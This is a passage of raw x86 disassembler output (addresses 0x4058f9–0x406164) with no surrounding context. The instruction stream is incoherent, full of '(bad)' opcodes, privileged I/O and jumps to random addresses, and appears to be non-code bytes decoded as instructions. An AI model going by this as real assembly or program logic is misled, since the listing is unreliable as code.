  4058f9:	rol    bl,cl
  4058fb:	retf   
  4058fc:	fst    st(0)
  4058fe:	hlt    
  4058ff:	lds    esi,FWORD PTR [edx-0x34070a10]
  405905:	mov    ecx,0xc8c8fedd
  40590a:	mov    esp,0xfac7c7c7
  40590f:	(bad)  
  405911:	ret    
  405912:	add    DWORD PTR [ebp-0x333413],edi
  405918:	out    dx,al
  405919:	mov    bl,0xd8
  40591b:	jmp    0xd1c7:0xb0c4cfd7
  405922:	retf   
  405923:	repz icebp 
  405925:	fcmovnu st,st(3)
  405927:	into   
  405928:	(bad)  
  405929:	mov    ebp,0xf2fbb5df
  40592e:	mov    ebp,0xfbc3c006
  405933:	loopne 0x40593a
  405935:	leave  
  405936:	in     eax,dx
  405937:	out    dx,eax
  405938:	enter  0xceb3,0xeb
  40593c:	mov    esp,0xe9fbe5c6
  405941:	rol    bh,1
  405943:	dec    bl
  405945:	hlt    
  405946:	mov    dh,0x2
  405948:	ror    dh,1
  40594a:	fsubrp st(3),st
  40594c:	inc    eax
  40594e:	out    0x6,eax
  405950:	loope  0x405957
  405952:	jmp    0xe1b6133
  405957:	loope  0x405923
  405959:	jmp    0x405944
  40595b:	loop   0x40592e
  40595d:	(bad)  
  40595e:	(bad)  
  40595f:	mov    dl,0xba
  405962:	scas   al,BYTE PTR es:[edi]
  405963:	fbstp  TBYTE PTR [eax-0x2240f2e]
  405969:	mov    esp,0xe4bee7f2
  40596e:	ret    0xc6c6
  405971:	retf   0xc9d6
  405974:	out    0xc7,al
  405976:	fstp   st(5)
  405978:	jecxz  0x405960
  40597a:	int3   
  40597b:	mov    esi,0xf0efe8c1
  405980:	test   ecx,0xfad8d8ba
  405986:	leave  
  405987:	mov    ecx,0xc3f1fad4
  40598c:	icebp  
  40598d:	int    0xc3
  40598f:	in     eax,0xcb
  405991:	aam    0xc0
  405993:	in     eax,0xc9
  405995:	out    0xeb,eax
  405997:	loope  0x40599e
  405999:	rol    esi,cl
  40599b:	mov    edi,0xede6f1bc
  4059a0:	loopne 0x405951
  4059a2:	in     al,0xf9
  4059a4:	mov    esi,0xf9cfffeb
  4059a9:	into   
  4059aa:	shl    DWORD PTR [ebp-0x29042713],cl
  4059b0:	lock add bh,bl
  4059b3:	add    al,BYTE PTR [edx]
  4059b5:	add    cl,ch
  4059b7:	add    ecx,ecx
  4059b9:	mov    dl,0xe0
  4059bb:	div    edx
  4059bd:	mov    dl,0xd6
  4059bf:	(bad)  
  4059c0:	(bad)  
  4059c1:	mov    edx,0xb9dafadf
  4059c6:	(bad)  
  4059c7:	out    dx,eax
  4059c8:	stc    
  4059c9:	loope  0x40599d
  4059cb:	mov    ebp,0xcbe4f2f4
  4059d0:	add    al,0xc6
  4059d2:	rol    cl,0x7
  4059d5:	push   es
  4059d6:	in     eax,dx
  4059d7:	int3   
  4059d8:	int3   
  4059d9:	in     al,dx
  4059da:	fsubrp st(2),st
  4059dc:	(bad)  
  4059dd:	lods   al,BYTE PTR ds:[esi]
  4059de:	in     al,0xf7
  4059e0:	shl    ebp,0xf7
  4059e3:	sti    
  4059e4:	shl    eax,cl
  4059e6:	xlat   BYTE PTR ds:[ebx]
  4059e7:	mov    cl,0xd9
  4059e9:	stc    
  4059ea:	call   0xfc4658c3
  4059ef:	retf   
  4059f0:	(bad)  [edx]
  4059f2:	fcmovnb st,st(0)
  4059f4:	jecxz  0x4059d2
  4059f6:	(bad)  
  4059f8:	(bad)  
  4059fa:	retf   0xf1d1
  4059fd:	mov    bl,0xdb
  4059ff:	repz stc 
  405a01:	mov    dl,0xc0
  405a03:	shr    ebp,1
  405a05:	mov    dh,0xda
  405a07:	mov    ch,0xf4
  405a09:	repz fcmovbe st,st(2)
  405a0c:	rol    DWORD PTR [ebx],1
  405a0e:	(bad)  
  405a0f:	shl    esi,cl
  405a11:	test   BYTE PTR [edi],0x0
  405a14:	aam    0xfa
  405a16:	out    0xc1,eax
  405a18:	loop   0x4059c8
  405a1a:	fsubr  st(4),st
  405a1c:	div    DWORD PTR [eax-0x311f1025]
  405a22:	(bad)  
  405a23:	in     eax,0xeb
  405a25:	in     al,0xff
  405a27:	aam    0x1
  405a29:	call   0xc5476103
  405a2e:	add    eax,ebx
  405a30:	shl    dl,0x9
  405a33:	out    0xe1,al
  405a35:	fld    QWORD PTR [edx]
  405a37:	int3   
  405a38:	adc    edx,ecx
  405a3a:	jmp    0xb3044d06
  405a3f:	icebp  
  405a40:	ret    0xf2e9
  405a43:	clc    
  405a44:	mov    ch,0xc5
  405a46:	aad    0xf8
  405a48:	loope  0x405a37
  405a4a:	rcl    al,0xc1
  405a4d:	mov    ebp,0xc2e6e2c1
  405a52:	fsub   st(3),st
  405a54:	add    BYTE PTR ds:0xcce00306,cl
  405a5a:	in     eax,0xae
  405a5c:	mov    esp,0xd2f7d3c3
  405a61:	mov    bh,0xdf
  405a63:	imul   dh
  405a65:	mov    ch,0xe8
  405a67:	out    dx,eax
  405a68:	ret    
  405a69:	aam    0xec
  405a6b:	clc    
  405a6c:	idiv   cl
  405a6e:	xlat   BYTE PTR ds:[ebx]
  405a6f:	out    0xe4,al
  405a71:	in     eax,0x1
  405a73:	dec    BYTE PTR [ecx]
  405a75:	loope  0x405a54
  405a77:	out    dx,eax
  405a78:	call   0xed070e5e
  405a7d:	mov    bl,0xe2
  405a7f:	in     eax,dx
  405a80:	(bad)  
  405a81:	cli    
  405a82:	retf   
  405a83:	clc    
  405a84:	retf   
  405a85:	shr    esi,1
  405a87:	stc    
  405a88:	add    eax,edx
  405a8a:	shl    cl,0xd7
  405a8d:	mul    dh
  405a8f:	sar    cl,cl
  405a91:	hlt    
  405a92:	sar    edi,0xeb
  405a95:	in     al,0xee
  405a97:	(bad)  
  405a98:	enter  0xecdf,0xe2
  405a9c:	lods   eax,DWORD PTR ds:[esi]
  405a9d:	scas   al,BYTE PTR es:[edi]
  405a9e:	shl    edi,cl
  405aa0:	call   0xdafc409a
  405aa5:	aad    0xf4
  405aa7:	fmul   st(6),st
  405aa9:	add    bl,cl
  405aab:	ret    
  405aac:	xlat   BYTE PTR ds:[ebx]
  405aad:	call   ebp
  405aaf:	pop    es
  405ab0:	cld    
  405ab1:	in     eax,0xc1
  405ab3:	add    DWORD PTR ds:0x11f8c203,eax
  405ab9:	ret    0xcfa6
  405abc:	int    0xc1
  405abe:	iret   
  405abf:	jecxz  0x405a77
  405ac1:	fxch   st(4)
  405ac3:	aad    0xd4
  405ac5:	fdiv   st(7),st
  405ac7:	out    dx,eax
  405ac8:	lock inc BYTE PTR [eax]
  405acb:	clc    
  405acc:	rol    BYTE PTR ds:0x7d2f4ec,cl
  405ad2:	add    ecx,ebp
  405ad4:	add    dl,ch
  405ad6:	les    ecx,FWORD PTR [ebx]
  405ad8:	out    dx,al
  405ad9:	ret    0xd6c0
  405adc:	int3   
  405add:	call   0xd8f404cd
  405ae2:	sar    BYTE PTR [eax-0x31012347],cl
  405ae8:	in     al,dx
  405ae9:	out    dx,al
  405aea:	int    0xcf
  405aec:	shl    bl,cl
  405aee:	jecxz  0x405ae9
  405af0:	stc    
  405af1:	cli    
  405af2:	(bad)  
  405af5:	movntq (bad),mm6
  405af6:	out    0xf3,eax
  405af8:	clc    
  405af9:	lds    ebp,FWORD PTR [ebp-0x4e10573d]
  405aff:	out    dx,al
  405b00:	idiv   DWORD PTR [ebx-0x244a3135]
  405b06:	repz mov cl,0xed
  405b09:	enter  0xd8fc,0x3
  405b0d:	fcmovnb st,st(0)
  405b0f:	clc    
  405b10:	loop   0x405b19
  405b12:	add    ecx,edi
  405b14:	fsincos 
  405b16:	or     bl,ah
  405b18:	shr    DWORD PTR [edi-0x3c113858],cl
  405b1e:	rcl    bh,1
  405b20:	call   0xce2b34f8
  405b25:	test   ebx,0x1c2c3f2
  405b2b:	shl    ebx,1
  405b2d:	rcl    edx,cl
  405b2f:	sar    esi,0xfb
  405b32:	psubq  mm1,QWORD PTR [eax]
  405b35:	or     al,0xed
  405b37:	push   es
  405b38:	shl    dl,0xce
  405b3b:	rol    al,cl
  405b3d:	scas   eax,DWORD PTR es:[edi]
  405b3e:	shl    BYTE PTR [eax-0xb4b2915],1
  405b44:	aad    0xb8
  405b46:	clc    
  405b47:	add    bh,dl
  405b49:	mov    ebx,0xdafdfef4
  405b4e:	cmc    
  405b4f:	loop   0x405b15
  405b51:	or     esp,edi
  405b53:	bswap  ebx
  405b55:	invd   
  405b57:	loop   0x405b3e
  405b59:	iret   
  405b5a:	mov    dl,0xe6
  405b5c:	iret   
  405b5d:	out    dx,eax
  405b5e:	scas   al,BYTE PTR es:[edi]
  405b5f:	sar    DWORD PTR [edx-0xc161914],1
  405b65:	mov    edx,0xeebae2f2
  405b6a:	mov    ebp,0x5d4b401
  405b6f:	add    eax,edx
  405b71:	shl    esi,0xd8
  405b74:	loopne 0x405b5a
  405b76:	loop   0x405b76
  405b78:	or     al,0xea
  405b7a:	repz ror esi,cl
  405b7d:	(bad)  
  405b7e:	lods   eax,DWORD PTR ds:[esi]
  405b7f:	retf   
  405b80:	mov    cl,0xec
  405b83:	mov    edx,0xe8edd2e6
  405b88:	mov    edi,0xd2d0ded7
  405b8d:	push   es
  405b8e:	out    0xf4,eax
  405b90:	(bad)  
  405b91:	fdivr  st(7),st
  405b93:	mul    ebx
  405b95:	push   es
  405b96:	push   cs
  405b97:	in     eax,0xc4
  405b99:	jmp    0x405b69
  405b9b:	lods   eax,DWORD PTR ds:[esi]
  405b9c:	out    dx,al
  405b9d:	jecxz  0x405b73
  405b9f:	aad    0xa8
  405ba1:	cli    
  405ba2:	clc    
  405ba3:	mov    edx,0xd0ece4e9
  405ba8:	shl    ebx,1
  405baa:	aam    0xf6
  405bac:	stc    
  405bad:	fdivr  st,st(7)
  405baf:	fcomp  st(7)
  405bb1:	test   bh,0xd9
  405bb4:	add    BYTE PTR [esi],al
  405bb6:	out    dx,eax
  405bb7:	out    dx,al
  405bb8:	or     ch,dl
  405bba:	icebp  
  405bbb:	iret   
  405bbc:	(bad)  
  405bbe:	mov    dl,0xef
  405bc0:	int3   
  405bc1:	retf   0xdae8
  405bc4:	mov    edi,0xc8bcf6ea
  405bc9:	cmc    
  405bca:	(bad)  
  405bcc:	div    dh
  405bce:	or     esi,eax
  405bd0:	ret    0xffd5
  405bd3:	push   es
  405bd4:	retf   0xee6
  405bd7:	fnstsw ax
  405bd9:	int    0xeb
  405bdb:	mov    edi,0xf7c0c9e4
  405be0:	out    dx,al
  405be1:	in     eax,dx
  405be2:	ror    dh,1
  405be4:	in     eax,dx
  405be5:	mov    eax,0xcfedfbbb
  405bea:	mov    esi,0xfebdc0d3
  405bef:	fsin   
  405bf1:	(bad)  
  405bf2:	sti    
  405bf3:	sti    
  405bf4:	cld    
  405bf5:	call   0xbe1f4ed6
  405bfa:	xlat   BYTE PTR ds:[ebx]
  405bfb:	mov    esi,0xe8bcb2e2
  405c00:	stc    
  405c01:	stc    
  405c02:	mov    dl,0xe7
  405c04:	ror    cl,cl
  405c06:	xlat   BYTE PTR ds:[ebx]
  405c07:	repz fucomi st,st(7)
  405c0a:	rcr    dh,1
  405c0c:	ret    0xd0f4
  405c0f:	aam    0xb
  405c11:	sti    
  405c12:	clc    
  405c13:	add    dh,cl
  405c15:	(bad)  
  405c16:	adc    edi,esp
  405c18:	repnz lock scas eax,DWORD PTR es:[edi]
  405c1b:	jmp    0xd5b2:0xeec0d5ee
  405c22:	retf   
  405c23:	in     al,dx
  405c24:	aam    0xb3
  405c26:	repnz (bad) 
  405c28:	in     eax,dx
  405c29:	call   0xfe234925
  405c2e:	ret    
  405c2f:	repz add eax,edi
  405c32:	leave  
  405c33:	div    esi
  405c35:	fmul   st,st(0)
  405c37:	out    0xb,eax
  405c39:	iret   
  405c3a:	repz (bad) 
  405c3c:	jmp    0xd517502f
  405c41:	jmp    0xbff8:0xb8b9e5f7
  405c48:	(bad)  
  405c49:	add    esp,ebx
  405c4b:	out    0xdd,al
  405c4d:	cld    
  405c4e:	sti    
  405c4f:	(bad)  
  405c52:	in     al,0xd8
  405c54:	(bad)  
  405c56:	out    0xc1,eax
  405c58:	add    eax,0xf3e4c1f3
  405c5d:	out    dx,eax
  405c5e:	enter  0xc7e6,0xb6
  405c62:	rcl    bl,cl
  405c64:	mov    edx,0xc9bde3ec
  405c69:	iret   
  405c6a:	loope  0x405c62
  405c6c:	div    ch
  405c6e:	repz aam 0xc7
  405c71:	aam    0xcb
  405c73:	loopne 0x405c72
  405c75:	add    eax,0xe3e9dcfd
  405c7a:	in     eax,dx
  405c7b:	call   0xb1093451
  405c80:	xlat   BYTE PTR ds:[ebx]
  405c81:	shl    esp,0xe7
  405c84:	in     al,dx
  405c85:	neg    ebx
  405c87:	ret    
  405c88:	(bad)  
  405c8a:	ret    0xbdf8
  405c8d:	in     eax,dx
  405c8e:	sti    
  405c8f:	(bad)  
  405c91:	jmp    0xfce9:0xdae1f7e3
  405c98:	in     eax,0xca
  405c9a:	retf   
  405c9b:	loop   0x405c4f
  405c9d:	lock sar dl,1
  405ca0:	enter  0xebf7,0xed
  405ca4:	imul   ebx
  405ca6:	mov    ebp,0xf8ddddc8
  405cab:	into   
  405cac:	std    
  405cad:	out    0xe6,al
  405caf:	(bad)  
  405cb0:	stc    
  405cb1:	jmp    0xd9cb:0xeed4bd01
  405cb8:	int    0xad
  405cba:	retf   0xcec4
  405cbd:	imul   esi
  405cbf:	test   eax,0xeeecd0f0
  405cc4:	in     eax,0xd9
  405cc6:	xlat   BYTE PTR ds:[ebx]
  405cc7:	inc    DWORD PTR [edx]
  405cc9:	(bad)  
  405ccb:	mov    ebp,0xf2f2cdd9
  405cd0:	inc    bh
  405cd2:	fmul   QWORD PTR [esi]
  405cd4:	or     eax,0xeb0b0f09
  405cd9:	mov    cl,0xd2
  405cdb:	loopne 0x405cd0
  405cdd:	in     eax,0xd2
  405cdf:	jmp    0xe4e8:0xf7b0d4f2
  405ce6:	mov    dh,0xe3
  405ce8:	mov    ah,0xd1
  405cea:	std    
  405ceb:	int3   
  405cec:	in     eax,0xdf
  405cee:	int3   
  405cef:	mov    BYTE PTR [edi],0xe6
  405cf2:	loop   0x405cb5
  405cf4:	add    al,BYTE PTR [ecx]
  405cf6:	cli    
  405cf7:	iret   
  405cf8:	shr    DWORD PTR [edx-0x362f521a],cl
  405cfe:	out    dx,al
  405cff:	icebp  
  405d00:	mov    dh,0xf7
  405d02:	idiv   ecx
  405d04:	in     al,dx
  405d05:	fdivrp st(6),st
  405d07:	fcmovnu st,st(4)
  405d09:	loopne 0x405cca
  405d0b:	(bad)  
  405d0d:	push   es
  405d0e:	stc    
  405d0f:	rcr    ecx,cl
  405d11:	jecxz  0x405d15
  405d13:	sar    ecx,0xc4
  405d16:	add    al,0xd
  405d18:	int3   
  405d19:	(bad)  
  405d1b:	shl    BYTE PTR [edx-0x1a29142e],cl
  405d21:	sar    ecx,cl
  405d23:	mov    dh,0xf4
  405d25:	aad    0xc8
  405d27:	enter  0xdff2,0xe3
  405d2b:	in     al,dx
  405d2c:	fscale 
  405d2e:	repnz fimul WORD PTR [edx]
  405d31:	add    dh,al
  405d33:	(bad)  
  405d34:	iret   
  405d35:	loop   0x405d3e
  405d37:	(bad)  
  405d39:	iret   
  405d3a:	mov    dl,0xaf
  405d3c:	out    dx,eax
  405d3d:	lods   eax,DWORD PTR ds:[esi]
  405d3e:	(bad)
  405d41:	lock (bad) 
  405d43:	mov    ecx,0xfdf7e5f9
  405d48:	cmc    
  405d49:	mov    ecx,0xc1d5f1e2
  405d4e:	loop   0x405d24
  405d50:	(bad)  
  405d51:	fdiv   st(3),st
  405d53:	jecxz  0x405d56
  405d55:	aam    0xf8
  405d57:	les    ecx,FWORD PTR [edi]
  405d59:	mov    ebx,0xbccfd3b3
  405d5f:	(bad)  
  405d61:	call   0xebf64734
  405d66:	iret   
  405d67:	int    0xfb
  405d69:	fucomi st,st(5)
  405d6b:	iret   
  405d6c:	ret    
  405d6d:	in     eax,0xbe
  405d6f:	add    eax,eax
  405d71:	add    ecx,DWORD PTR [edi]
  405d73:	fmulp  st(0),st
  405d75:	add    eax,0xe00007fe
  405d7a:	in     eax,dx
  405d7b:	rcl    esi,0xf7
  405d7e:	in     al,dx
  405d7f:	retf   
  405d80:	test   al,0xe6
  405d82:	(bad)  
  405d83:	mov    edx,0xf4bcf1b0
  405d88:	add    al,BYTE PTR [edx]
  405d8a:	repz in eax,dx
  405d8c:	jmp    esi
  405d8e:	sar    BYTE PTR [ebp+0xd907c1],cl
  405d94:	fndisi(8087 only) 
  405d96:	fucomp st(5)
  405d98:	cli    
  405d99:	retf   
  405d9a:	repnz icebp 
  405d9c:	faddp  st(5),st
  405d9e:	enter  0xb3f2,0xea
  405da2:	in     eax,0xff
  405da4:	leave  
  405da5:	repz (bad) 
  405da8:	xlat   BYTE PTR ds:[ebx]
  405da9:	aad    0xd4
  405dab:	fsub   st,st(7)
  405dad:	int    0xf2
  405daf:	xlat   BYTE PTR ds:[ebx]
  405db0:	mov    esp,0xc00004dd
  405db5:	or     ebx,ebx
  405db7:	rcl    edx,0xad
  405dba:	repz repnz mov al,0xc7
  405dbe:	int    0xc2
  405dc0:	in     eax,0xf9
  405dc2:	int    0xf5
  405dc4:	iret   
  405dc5:	lds    edi,FWORD PTR [ecx-0x24131c15]
  405dcb:	loop   0x405da5
  405dcd:	push   esp
  405dcf:	fcomip st,st(4)
  405dd1:	add    edx,eax
  405dd3:	add    DWORD PTR [ebp+edx*8-0x38f5fb20],edi
  405dda:	lods   eax,DWORD PTR ds:[esi]
  405ddb:	ror    eax,0xb6
  405dde:	ret    
  405ddf:	mov    bh,0xe4
  405de1:	repnz retf 
  405de3:	shl    edi,cl
  405de5:	call   0xf33d2eb6
  405dea:	cmc    
  405deb:	into   
  405dec:	int    0x1
  405dee:	(bad)  
  405df0:	fucomp st(1)
  405df2:	pavgw  mm4,mm0
  405df5:	add    ch,bh
  405df7:	repnz std 
  405df9:	mov    cl,0xcc
  405dfb:	in     eax,dx
  405dfc:	call   0xd23330c7
  405e01:	shl    DWORD PTR [esi-0xf26454c],0xc3
  405e08:	mov    ebx,0xcee0c1d9
  405e0d:	int    0xc4
  405e0f:	or     al,BYTE PTR ds:0xe3c9d401
  405e15:	out    dx,eax
  405e16:	add    esp,esp
  405e18:	repz lds ebp,FWORD PTR [esi-0x184e3441]
  405e1f:	repnz shl ebx,0xd5
  405e23:	in     al,0xe6
  405e25:	enter  0xb8dd,0xb9
  405e29:	out    dx,al
  405e2a:	jecxz  0x405e07
  405e2c:	push   es
  405e2d:	std    
  405e2e:	add    eax,0xd9e0ffdc
  405e33:	(bad)  
  405e34:	call   esp
  405e36:	jmp    0xf1ed:0xdec0e309
  405e3d:	lods   al,BYTE PTR ds:[esi]
  405e3e:	in     al,0xe7
  405e40:	test   dl,0xea
  405e43:	mov    dh,0xed
  405e45:	(bad)  
  405e48:	(bad)  
  405e49:	fucomp st(0)
  405e4b:	(bad)  
  405e4d:	rcr    edi,0xff
  405e50:	shr    dl,1
  405e52:	ret    0x408
  405e55:	in     eax,0xeb
  405e57:	in     eax,0x7
  405e59:	(bad)
  405e5d:	fnsave [edx-0x35301353]
  405e63:	mov    ah,0xcd
  405e65:	jmp    0xeefe:0xd0caf0f9
  405e6c:	out    dx,al
  405e6d:	mov    ebx,0xfd02f1e6
  405e72:	xlat   BYTE PTR ds:[ebx]
  405e73:	retf   0xcdf9
  405e76:	fucomi st,st(4)
  405e78:	or     BYTE PTR [edi-0x16285630],ah
  405e7e:	stos   BYTE PTR es:[edi],al
  405e7f:	imul   ebp
  405e81:	xlat   BYTE PTR ds:[ebx]
  405e82:	out    dx,eax
  405e83:	in     al,0xee
  405e85:	shr    ah,1
  405e87:	neg    cl
  405e89:	lock dec ah
  405e8c:	mov    esp,0xd805c2c2
  405e91:	leave  
  405e92:	or     ch,bh
  405e94:	cmc    
  405e95:	(bad)  
  405e97:	ror    edx,cl
  405e99:	lock repz retf 
  405e9c:	lock ret 
  405e9e:	(bad)  
  405e9f:	call   0xf2f8386f
  405ea4:	clc    
  405ea5:	in     eax,0xf9
  405ea7:	leave  
  405ea8:	mov    ebp,0xc206d5dc
  405ead:	mov    esp,0xfd01c5f1
  405eb2:	rcr    cl,0xe5
  405eb5:	fsubp  st(3),st
  405eb7:	out    dx,al
  405eb8:	repz ret 0xc5e9
  405ebc:	test   al,0xeb
  405ebe:	ror    ecx,1
  405ec0:	into   
  405ec1:	(bad)  
  405ec2:	cmc    
  405ec3:	(bad)  
  405ec4:	repnz mov bh,0xf3
  405ec7:	leave  
  405ec8:	std    
  405ec9:	loopne 0x405e9e
  405ecb:	out    0xd3,al
  405ecd:	neg    ebp
  405ecf:	dec    BYTE PTR [ecx]
  405ed1:	clc    
  405ed2:	idiv   esi
  405ed4:	add    al,0xcd
  405ed6:	loop   0x405ec4
  405ed8:	int    0xb3
  405eda:	out    0xe6,al
  405edc:	mov    esi,0xb0c2c8f7
  405ee1:	aam    0xfb
  405ee3:	int3   
  405ee4:	mov    edx,0xdcbadbc4
  405ee9:	loopne 0x405ea3
  405eeb:	rol    al,cl
  405eed:	repnz in eax,0xf6
  405ef0:	jmp    0xe10148df
  405ef5:	(bad)  
  405ef6:	retf   0xffdc
  405ef9:	retf   
  405efa:	shl    eax,cl
  405efc:	int3   
  405efd:	repnz into 
  405eff:	test   eax,0xe4daf8e7
  405f04:	fcmovb st,st(4)
  405f06:	clc    
  405f07:	stc    
  405f08:	loop   0x405ec3
  405f0a:	call   0x6073c00
  405f0f:	(bad)  
  405f11:	sti    
  405f12:	or     eax,eax
  405f14:	fld    DWORD PTR [esi]
  405f16:	fcmovu st,st(3)
  405f18:	jecxz  0x405ee3
  405f1a:	jmp    0xb0f6:0xb1f2cac6
  405f21:	(bad)  
  405f22:	clc    
  405f23:	(bad)  
  405f24:	leave  
  405f25:	out    dx,eax
  405f26:	idiv   ebp
  405f28:	fst    st(0)
  405f2a:	call   ecx
  405f2c:	clc    
  405f2d:	clc    
  405f2e:	jmp    esp
  405f30:	add    al,0xc2
  405f32:	les    eax,FWORD PTR [ecx]
  405f34:	or     edi,esp
  405f36:	add    eax,0xb0c3f8c5
  405f3b:	mov    dl,0xbc
  405f3d:	cmc    
  405f3e:	mov    ch,0xd2
  405f40:	ror    esi,1
  405f42:	xlat   BYTE PTR ds:[ebx]
  405f43:	enter  0xf1cf,0xd4
  405f47:	fdivr  QWORD PTR [eax-0x41221f04]
  405f4d:	repz fdivp st(3),st
  405f50:	loope  0x405f16
  405f52:	(bad)  
  405f53:	leave  
  405f54:	ror    BYTE PTR [edx],0xdb
  405f57:	enter  0xe900,0xc0
  405f5b:	test   eax,0xf3cce7e5
  405f60:	aam    0xc8
  405f62:	iret   
  405f63:	in     eax,0xf1
  405f65:	hlt    
  405f66:	out    dx,al
  405f67:	sar    BYTE PTR [edx-0x222a22fd],1
  405f6d:	mov    esp,0xbdff7fa
  405f72:	(bad)
  405f75:	pmaxub mm6,mm2
  405f78:	loopne 0x405f6b
  405f7a:	les    ebp,FWORD PTR [ecx-0x161e5312]
  405f80:	lods   al,BYTE PTR ds:[esi]
  405f81:	test   ebx,0xb2d8b0fb
  405f87:	clc    
  405f88:	mov    al,0xf0
  405f8a:	sar    ch,0xd5
  405f8d:	add    ch,bl
  405f8f:	mov    esp,0xc8e7d1b8
  405f94:	fdivr  st,st(5)
  405f96:	(bad)  
  405f98:	in     al,dx
  405f99:	into   
  405f9a:	lods   al,BYTE PTR ds:[esi]
  405f9b:	lods   al,BYTE PTR ds:[esi]
  405f9c:	call   0xe131488e
  405fa1:	sti    
  405fa2:	fdivr  DWORD PTR [ecx-0x47253b3c]
  405fa8:	mov    ecx,0xdec3d0bb
  405fad:	in     eax,0xe6
  405faf:	ror    bl,0xe5
  405fb2:	fcmovb st,st(1)
  405fb4:	pop    es
  405fb5:	cmc    
  405fb6:	add    eax,0xd1cde904
  405fbb:	leave  
  405fbc:	(bad)  
  405fbd:	mul    edx
  405fbf:	mov    bh,0xee
  405fc1:	mov    dh,0xf6
  405fc3:	retf   0xe9d5
  405fc6:	ror    bl,1
  405fc8:	fcomp  st(6)
  405fca:	repz loope 0x405fce
  405fcd:	shl    esi,1
  405fcf:	sti    
  405fd0:	(bad)  
  405fd1:	(bad)  
  405fd3:	or     ch,bl
  405fd5:	jmp    0x405fb4
  405fd7:	adc    cl,bl
  405fd9:	icebp  
  405fda:	lock out 0xbe,eax
  405fdd:	enter  0xc9bc,0xca
  405fe1:	in     eax,0xe8
  405fe3:	clc    
  405fe4:	fcmovne st,st(0)
  405fe6:	jecxz  0x405fa0
  405fe8:	iret   
  405fe9:	repnz out dx,eax
  405feb:	mov    ebp,0xf2c2d1f1
  405ff0:	aam    0xc4
  405ff2:	aad    0xf8
  405ff4:	fcmovnbe st,st(5)
  405ff6:	add    esi,ecx
  405ff8:	add    al,0xc7
  405ffa:	retf   0xeaea
  405ffd:	int    0xc5
  405fff:	sti    
  406000:	les    esi,FWORD PTR [esi-0x4c003138]
  406006:	clc    
  406007:	cmc    
  406008:	mov    eax,0xd7fbd0fc
  40600d:	aam    0xde
  40600f:	add    al,0xeb
  406011:	aam    0xc9
  406013:	(bad)  
  406014:	call   0xd24f2f11
  406019:	in     al,0xe1
  40601b:	mov    al,0xb7
  40601d:	hlt    
  40601e:	fucomi st,st(1)
  406020:	lods   al,BYTE PTR ds:[esi]
  406021:	mov    ecx,0xbee6b5cd
  406026:	mov    ebx,0xe3e2deb5
  40602b:	add    dh,dl
  40602d:	mov    ebx,0xd4f202dc
  406032:	loop   0x405ffa
  406034:	(bad)  
  406036:	int    0x13
  406038:	jmp    0x405fe9
  40603a:	fdivr  st(0),st
  40603c:	in     eax,0xe3
  40603e:	mov    esp,0xdbb9b4c7
  406043:	mov    ah,0xbe
  406045:	lock fcmovu st,st(1)
  406048:	aam    0xda
  40604a:	icebp  
  40604b:	mov    ebp,0xbce1e302
  406050:	jmp    0xd51a4617
  406055:	pop    es
  406056:	loop   0x406040
  406058:	in     eax,0xb3
  40605a:	ror    esp,0xc7
  40605d:	iret   
  40605e:	mov    esp,0xb5f1e5cc
  406063:	into   
  406064:	jmp    0xd5234e20
  406069:	(bad)  
  40606b:	add    edx,eax
  40606d:	loope  0x40602f
  40606f:	inc    esi
  406071:	jecxz  0x40607a
  406073:	(bad)  
  406076:	out    0xee,eax
  406078:	add    al,0xa7
  40607a:	(bad)  
  40607c:	out    dx,eax
  40607d:	loop   0x40606a
  40607f:	retf   0xb0ea
  406082:	fadd   st,st(5)
  406084:	retf   0xd9cf
  406087:	out    dx,al
  406088:	jecxz  0x40607d
  40608a:	cld    
  40608b:	mov    eax,0xfef2fa
  406090:	or     al,ch
  406092:	mov    ecx,0xe7d4efd6
  406098:	fidiv  DWORD PTR [ebx-0x321b1f23]
  40609e:	jecxz  0x406076
  4060a0:	fcmovnbe st,st(7)
  4060a2:	out    0xb8,al
  4060a4:	test   al,0xe9
  4060a7:	lock stc 
  4060a9:	aam    0xfa
  4060ab:	iret   
  4060ac:	fsin   
  4060ae:	idiv   ah
  4060b0:	faddp  st(2),st
  4060b2:	(bad)  
  4060b4:	aad    0xfb
  4060b6:	fimul  WORD PTR [ecx]
  4060b8:	bts    eax,eax
  4060bb:	rol    edi,1
  4060bd:	fmul   st(4),st
  4060bf:	jmp    0x4060b8
  4060c1:	retf   
  4060c2:	cmc    
  4060c3:	(bad)  
  4060c4:	aad    0xd5
  4060c6:	iret   
  4060c7:	jmp    0xda2f378a
  4060cc:	repnz loopne 0x4060b0
  4060cf:	(bad)  
  4060d0:	cld    
  4060d1:	add    ecx,DWORD PTR [ebx]
  4060d3:	rol    DWORD PTR [edx+ecx*8],0xd4
  4060d7:	(bad)  
  4060d8:	loopne 0x4060bc
  4060da:	call   0xb2fe53cf
  4060df:	retf   0xdbb2
  4060e2:	fsincos 
  4060e4:	not    ebp
  4060e6:	enter  0xc3f2,0xd3
  4060ea:	std    
  4060eb:	out    dx,eax
  4060ec:	mov    DWORD PTR [ecx],0xd6e102d2
  4060f2:	cli    
  4060f3:	in     al,0xef
  4060f5:	stc    
  4060f6:	or     DWORD PTR [eax],eax
  4060f8:	stc    
  4060f9:	mov    ah,0xf7
  4060fc:	shl    al,1
  4060fe:	jmp    0xee162cd1
  406103:	in     al,dx
  406104:	iret   
  406105:	int3   
  406106:	mov    esp,0xfdf1ccd8
  40610b:	fcmovu st,st(1)
  40610d:	(bad)  
  40610f:	cli    
  406110:	sti    
  406111:	retf   0xe0d8
  406114:	or     eax,0x3c8faec
  406119:	mov    cl,0xb1
  40611c:	loope  0x406111
  40611e:	iret   
  40611f:	mov    dl,0xf2
  406121:	(bad)  
  406123:	(bad)  
  406125:	mov    bl,0xdc
  406127:	loop   0x4060f2
  406129:	std    
  40612a:	(bad)  
  40612c:	add    ch,bh
  40612e:	ret    
  40612f:	fstp   st(7)
  406131:	or     edx,esp
  406133:	add    al,0xf8
  406135:	out    dx,al
  406136:	out    dx,eax
  406137:	lds    edx,FWORD PTR [edx]
  406139:	rol    cl,1
  40613b:	mov    cl,0xb3
  40613d:	(bad)  
  40613f:	ret    0xcac6
  406142:	jmp    0x406115
  406144:	fistp  QWORD PTR [ebp-0x260b3429]
  40614a:	lock mov esp,0xe0e3c7de
  406150:	push   es
  406151:	fmul   st(2),st
  406153:	sti    
  406154:	neg    al
  406156:	into   
  406157:	or     esi,ecx
  406159:	loop   0x40613b
  40615b:	scas   eax,DWORD PTR es:[edi]
  40615c:	iret   
  40615d:	lods   eax,DWORD PTR ds:[esi]
  40615e:	shr    bh,cl
  406160:	retf   
  406161:	repnz in al,0xb6
  406164:	fsin   
